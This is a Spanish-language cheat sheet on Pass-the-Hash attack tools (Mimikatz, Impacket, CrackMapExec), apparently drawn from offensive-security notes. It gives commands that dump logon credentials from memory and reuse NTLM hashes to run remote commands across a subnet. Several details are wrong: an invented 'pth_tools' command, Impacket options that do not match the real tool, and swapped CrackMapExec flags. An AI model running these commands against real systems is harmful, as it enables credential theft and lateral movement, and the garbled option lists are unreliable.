### **Ataques de Pass-the-Hash/PtH Tools.md**

# PtH Tools

## Descripción

`PtH Tools` se refiere a un conjunto de herramientas diseñadas para facilitar ataques Pass-the-Hash (PtH). Estos ataques permiten a un atacante autenticar en sistemas Windows utilizando hashes de contraseñas en lugar de contraseñas en texto plano, evitando así la necesidad de conocer la contraseña real.

## Uso

```bash
pth_tools [herramienta] [opciones]
```

### Herramientas principales

- **WCE (Windows Credentials Editor):** Permite la manipulación de credenciales en memoria.
- **Mimikatz:** Extrae y utiliza hashes NTLM para autenticación.
- **Impacket:** Proporciona scripts para ejecutar comandos remotamente utilizando PtH.
- **CrackMapExec:** Automatiza la explotación de PtH en redes.

## Opciones principales

Dependiendo de la herramienta específica, las opciones pueden variar. A continuación se presentan ejemplos con `Impacket` y `CrackMapExec`.

### Impacket

- `-u`, `--username`: Nombre de usuario.
- `-p`, `--password`: Contraseña o hash NTLM.
- `-d`, `--domain`: Dominio objetivo.
- `-H`, `--hash`: Hash NTLM para autenticación.
- `-c`, `--command`: Comando a ejecutar remotamente.

### CrackMapExec

- `--hashes`: Proporciona hashes NTLM para autenticación.
- `-u`, `--username`: Nombre de usuario.
- `-p`, `--password`: Contraseña.
- `-x`, `--exec-method`: Método de ejecución remota.
- `-M`, `--module`: Especifica un módulo para ejecutar.

## Ejemplos

- Usar Mimikatz para extraer hashes y realizar PtH:
  
  ```bash
  mimikatz.exe
  sekurlsa::logonpasswords
  sekurlsa::pth /user:usuario /domain:dominio /ntlm:HASH
  ```

- Ejecutar un comando remoto usando Impacket:
  
  ```bash
  psexec.py usuario:HASH@192.168.1.10 "ipconfig /all"
  ```

- Automatizar PtH con CrackMapExec:
  
  ```bash
  cme smb 192.168.1.0/24 -u usuario -H HASH --exec-method smbexec -x "whoami"
  ```
